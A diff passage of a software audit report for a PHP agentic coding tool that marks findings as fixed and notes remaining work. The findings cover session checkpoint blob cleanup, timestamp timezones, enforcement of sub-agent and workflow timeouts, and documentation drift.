-- **Where:** `src/Session/EnhancedSessionStore.php:1118-1141` (`pruneOldCheckpoints` deletes rows only); the only GC call site is `restoreCheckpoint()` `:1066`
-- **Repro:** 150 checkpoints with a simulated compaction every 30 turns left 100 checkpoints, **150 blobs, 121 referenced**: 29 orphans, each potentially a 1 MiB tool result. On long sessions with compaction this grows without bound until the session is deleted.
-- **Fix:** call `collectCheckpointBlobs()` from `pruneOldCheckpoints()` when rows were deleted (it is cheap: one scan per session).
-- **Test:** the repro loop, asserting `count(blobs) == count(referenced)`.
-- **Repro:** `blobs.php`
-
-#### SES-5 — Mixed local and UTC timestamps in one DB
-- **Severity:** Low
-- **Confidence:** Verified-by-reading
-- **Where:** `EnhancedSessionStore::saveCheckpoint` `:495` uses `(new \DateTimeImmutable())->format(...)` (process timezone). Everything else uses `CURRENT_TIMESTAMP` or `gmdate` (UTC). `saveSessionMeta` `:252` uses whatever timezone the caller's DateTime has. `listSessionsWithMeta` `:267` orders by `COALESCE(sm.last_activity, s.updated_at)`, which mixes the two.
-- **Impact:** checkpoint `created_at` shown in `/rewind` listings is off by the UTC offset, and ordering across meta and session rows is skewed by the offset.
-- **Fix:** use `gmdate('Y-m-d H:i:s')` everywhere.
-
-#### SES-6 — `getMessages()` orders by `created_at` (one-second resolution) with no tiebreaker
-- **Severity:** Low (latent: the table is currently dead; see SES-2)
-- **Where:** `SessionStore.php:398-400`
-- **Fix:** `ORDER BY created_at ASC, id ASC`.
+- **Partly fixed on master in `698a1efff`** (part (a), with SES-2). Checkpoints carry `UNIQUE(session_id, "index")`, and the index is allocated inside a `BEGIN IMMEDIATE` transaction together with the insert. An idempotent migration renumbers existing duplicate indexes and drops the redundant old index. Save, checkpoint and restore each run in one IMMEDIATE transaction, which also closes the blob-intern race described above. **Remaining:** part (b), a per-session writer lock and what a second TUI on the same session should do (refuse, open read-only, or fork), is a deferred decision (wave plan §3 #9). Until then two TUIs on one session still overwrite each other's transcript (last writer wins) and both append checkpoints to it.
 
 ---
 
@@ -20952,6 +20874,13 @@ Its only finding, CLI-1, was fixed in wave 3; see **Fixed since audit**.
 - **Fix:** drop terminal sub-agents after the pane has shown them (or keep the newest N per agent name), the way projected rows are already cleared.
 - **Test:** run 200 fake-executor sub-agents through `executeAll()`; assert the map stays bounded and `liveOutputs()` still reports running ones.
 
+#### AG-5 — Two dormant sub-agent paths would now kill their agents at 300 s
+- **Severity:** Low (dormant) · **Confidence:** Verified-by-reading (found while fixing WF-1 in wave 4)
+- **Where:** the fork path of `Chat::executeAgents()` (`src/Chat.php:7285`; the pool it builds there gets a forked `EngineExecutor` and no time bound) and `App::dispatchSkill()` (`src/App/App.php:910`, `new SubAgent(` at `:960` with no `timeout:`). Both rely on the constructor default `timeout: 300` (`src/Agents/SubAgent.php:66`).
+- **Detail:** before WF-1 (a) (`4fa805970`), nothing read `SubAgent::$timeout`, so the default 300 was inert. `AgentWorkerPool` now enforces it on its forking path, so a sub-agent started through either of these paths would be killed with its whole process tree at 300 s and settle `TimedOut`, whatever the configured timeout says. Neither path has a production caller today (`App::dispatchSkill()`'s own comment says so, and nothing in `src/` or `bin/` calls `Chat::executeAgents()`), so nothing breaks yet.
+- **Fix:** when either path is wired, give its SubAgents a real budget: the configured timeout (for example `AgentPoolConfig::$defaultTimeoutSeconds`, which `executeAgents()` already passes to its `ProcessExecutor` branch), or `0` for no per-agent bound.
+- **Test:** a forked fake executor that outlives a 1 s budget passed through each path settles `TimedOut` at that budget, and one under `timeout: 0` is not killed.
+
 ---
 
 ### F. Workflows
@@ -20975,6 +20904,10 @@ The baseline item "only the first task of a stage runs" (`WorkflowEngine.php:106
 - **Scenario:** a stage whose agent runs a Bash command that never exits (Bash has no timeout, Part II #7) or calls an MCP tool that never answers (Part II #11). The workflow sits in the live pane forever. The author's `timeout: 1800` does nothing, a `retries(1)` task that fails is never retried, and the only way out is killing the TUI.
 - **Fix:** enforce `SubAgent::$timeout` in the pool. Record a deadline at dispatch; on expiry, `terminateWorker()` and settle `TimedOut` (the status and `buildStageResult()` mapping already exist). Default it from `Workflow::$timeout` instead of the literal 300. Either implement `maxRetries` in `executeAll()` (re-queue on `isFailure()`) or refuse `retries` at load time and remove it from the docs.
 - **Test:** a forked executor that sleeps 10 s, a task with `timeout(1)`; assert a `TimedOut` stage result in under 3 s and that the child is gone.
+- **Partly fixed on master in `4fa805970`** (part (a)). `AgentWorkerPool` enforces a per-agent deadline from `SubAgent::$timeout` on its forking path: on overrun `ProcessContainment::killTree()` kills the worker and everything it started, and the agent settles `TimedOut`. A new `withTimeBudget()` bounds a whole `executeAll()`. `WorkflowEngine` passes `Workflow::$timeout` to every stage executor, the per-task fallback is `$task->timeout ?? config.timeout` instead of the literal 300, and the stages of one run share one budget. `docs/WORKFLOWS.md` and `examples/workflows/lint-then-fix.yaml` are corrected (DOC-1 item 2). **Remaining:**
+  - (b) retries are deferred (wave plan §3 #10); they are now documented as recorded but not enforced, and `->retries(1)` is gone from the PHP example. The `AgentPoolConfig::$maxRetries` "DORMANT SEAM" note (`src/Agents/AgentPoolConfig.php:34`) stands.
+  - The synchronous dispatch paths (an injected executor, no pcntl, or a failed fork) cannot be interrupted: `AgentWorkerPool::executeOne()` without a forked executor still calls `ProcessExecutor::execute()` inline, with that executor's own 300 s default (`src/Agents/ProcessExecutor.php:62`).
+  - The cancel path, `AgentWorkerPool::terminateWorker()` (`:1247`), still sends SIGTERM to the root pid only, not `killTree()`.
 
 #### WF-2 — `/workflow pause` cannot pause a running workflow; resuming a *failed* run skips the failed stage and reports success; the pause file is never cleared
 - **Severity:** Medium
@@ -21082,10 +21015,11 @@ The baseline item "only the first task of a stage runs" (`WorkflowEngine.php:106
 - **Confidence:** Verified-by-reading
 - **Items:**
   1. `docs/TROUBLESHOOTING.md:136-139` says an unknown `type` makes startup "ordering-dependent: servers listed after it were never reached". `McpClient::startServers()` `src/MCP/McpClient.php:116-146` attempts every entry, collects failures, and throws once at the end. `docs/MCP.md:136` describes this correctly. The troubleshooting advice ("move the bad entry") is stale.
-  2. `docs/WORKFLOWS.md:63,81,245-246,255-261` and `examples/workflows/lint-then-fix.yaml:19-20`: timeout and retries semantics that do not exist (WF-1).
+  2. `docs/WORKFLOWS.md:63,81,245-246,255-261` and `examples/workflows/lint-then-fix.yaml:19-20`: timeout and retries semantics that do not exist (WF-1). **Fixed on master in `4fa805970`** with WF-1 (a): `docs/WORKFLOWS.md` has a new section, "`timeout` is a per-stage wall-clock budget", the fallback sentence is corrected, retries are documented as recorded but not enforced, and the example YAML's comment is corrected.
   3. `docs/WORKFLOWS.md:113`: `{{agentName.results}}` for parallel agents (WF-3).
   4. Resolved since the audit: the Stdio/HTTP "works" rows in `docs/MCP.md` and the `mcp__git__*: allow` + `Write: deny` example in `docs/PERMISSIONS.md` became true when MCP-1, MCP-2 and GIT-1 were fixed.
 - **Fix:** correct each one alongside its finding. Item 1 stands alone: delete the ordering paragraph.
+- **Remaining:** items 1 and 3 (wave plan w5-mcp-transport and w5-wf-state); item 2 is fixed.
 
 ---
 
@@ -21094,9 +21028,8 @@ The baseline item "only the first task of a stage runs" (`WorkflowEngine.php:106
 | ID | Severity | Confidence | Title |
 |---|---|---|---|
 | MCP-3 | Medium | Verified-by-repro | `ClaudeCodeMcpClient` gives up after ~1 s per call; initialize sent as a notification |
-| SES-2 | Medium | Verified-by-repro | `forkSession` copies dead tables (empty fork, no checkpoints, duplicate name; `--resume name` opens the parent) |
-| SES-3 | Medium | Verified-by-reading | No per-session writer lock; two TUIs clobber the transcript; checkpoint index and blob-intern races |
-| WF-1 | Medium | Verified-by-reading | Workflow/task `timeout` and `retries` are never enforced; stages have no wall-clock bound |
+| SES-3 | Medium | Verified-by-reading | No per-session writer lock; two TUIs clobber the transcript; checkpoint index and blob-intern races. Partly fixed (`698a1efff`: `UNIQUE(session_id,"index")`, IMMEDIATE allocation, duplicate-renumbering migration; closes the index and blob-intern races); remaining: (b) writer lock and second-TUI behaviour (deferred decision) |
+| WF-1 | Medium | Verified-by-reading | Workflow/task `timeout` and `retries` are never enforced; stages have no wall-clock bound. Partly fixed (`4fa805970`: per-agent deadline with `killTree()`, `withTimeBudget()`, `Workflow::$timeout` reaches every stage); remaining: (b) retries (deferred decision), synchronous dispatch paths uninterruptible, cancel path SIGTERMs the root only |
 | WF-2 | Medium | Verified-by-repro | `/workflow pause` only snapshots finished runs; resume skips the failed stage and reports "completed"; pause file never cleared |
 | MCP-4 | Low-Med | Verified-by-reading | A stray non-JSON stdout line aborts the MCP request |
 | BG-1 | Low-Med | Verified-by-reading | Background sessions cannot be stopped (STOP has no sender) |
@@ -21108,12 +21041,10 @@ The baseline item "only the first task of a stage runs" (`WorkflowEngine.php:106
 | MCP-7 | Low-Med | Verified-by-repro | OAuth store stale-cache write-back erases another process's credentials; non-atomic write |
 | MCP-8 | Low-Med | Verified-by-repro | Failed re-registration persists `client_id` as a never-expiring bearer token |
 | CLI-2 | Low-Med | Verified-by-repro | `sugarcrush <dir>` ignores bare directory names; non-path positionals silently dropped. Partly fixed (`b899773a6`: existing-dir positional is the root, other leftovers exit 2 with a `-p` hint); remaining: (b) leftovers as the TUI's initial prompt (deferred decision) |
-| SES-4 | Low | Verified-by-repro | Checkpoint blobs GC'd only on /rewind; orphans accumulate |
-| SES-5 | Low | Verified-by-reading | Mixed local/UTC timestamps |
-| SES-6 | Low | Verified-by-reading | `getMessages` ordering tiebreak |
 | BG-2 | Low | Verified-by-reading | Background IPC directories never cleaned |
 | AG-3 | Low | Verified-by-reading | `AgentManager` never forgets sub-agents; unbounded growth plus a per-frame scan |
-| DOC-1 | Low | Verified-by-reading | Doc drift: TROUBLESHOOTING startup ordering, plus doc halves of WF-1/WF-3 |
+| DOC-1 | Low | Verified-by-reading | Doc drift: TROUBLESHOOTING startup ordering, plus doc halves of WF-1/WF-3. Partly fixed (`4fa805970`: item 2, the WF-1 doc half); remaining: items 1 and 3 |
+| AG-5 | Low (dormant) | Verified-by-reading | Dormant `Chat::executeAgents()` fork path and `App::dispatchSkill()` run SubAgents with the default 300 s timeout, which WF-1 (a) now enforces |
 
 ---
 
@@ -21200,3 +21131,7 @@ These findings were fixed on master after the audit. Their sections and table ro
 - **AG-4** `AgentManager::executeSubAgent()` swallowed provider errors the way 15a A1 did — fixed on master in `48e9a3f65` (it throws `ProviderResponseException` after the retry loops; the sub-agent ends `STATUS_FAILED` carrying the provider text). `TaskTool::runOnEngine` and the workflow `EngineExecutor` were checked: they go through `EngineBackend`/`Runtime`, which A1 fixed, and are pinned by regression tests.
 - **MCP-9** Empty maps nested inside a tool's arguments went on the wire as `[]` — fixed on master in `f84a97364` (new sugar-mcp `ArgumentShape::conform()` walks the arguments against the tool's `inputSchema`; applied in sugar-mcp `StdioMcpServer`, crush `HttpMcpServer` and `ClaudeCodeMcpServer`).
 - **CLI-1** Headless JSON stdout was not protected from PHP diagnostics — fixed on master in `0c2bbd0a7` (`display_errors=stderr` is the first statement of `bin/sugarcrush`; `Bootstrap::ensureDir()` reports the `mkdir` reason in its own exception through a handler scoped to the call, because `@` plus `error_get_last()` loses it under a host handler; on the TUI with the 15a C2 log file in place, `display_errors` is 0 and a fatal prints one "details in <log>" line to stderr).
+- **SES-2** `forkSession()` copied only the dead legacy tables, so a fork had no transcript, checkpoints or meta and shared its parent's name — fixed on master in `698a1efff` (`EnhancedSessionStore::forkSession()` copies the transcript, checkpoints, blobs (re-keyed to the fork, with checkpoint envelope ids remapped) and meta in one transaction; the fork is named `<name> (branch)`, then `<name> (branch N)`; `getSessionByName()` is deterministic). Still open nearby: the `/fork` background daemon does not load the copied transcript (Part II #30), and a `/fork` docblock still names the old method (15b-33).
+- **SES-6** `getMessages()` ordered by `created_at` with no tiebreak — fixed on master in `698a1efff` (folded into SES-2: `ORDER BY created_at, id`).
+- **SES-4** Checkpoint blobs were garbage-collected only on `/rewind` — fixed on master in `698a1efff` (`pruneOldCheckpoints()` runs the blob GC, and the GC drops only the deleted ids from the intern cache).
+- **SES-5** Checkpoint and meta timestamps mixed local time and UTC — fixed on master in `698a1efff` (checkpoint `created_at` and `last_activity` are written and read as UTC). Residual: rows written in local time before the fix are not converted.
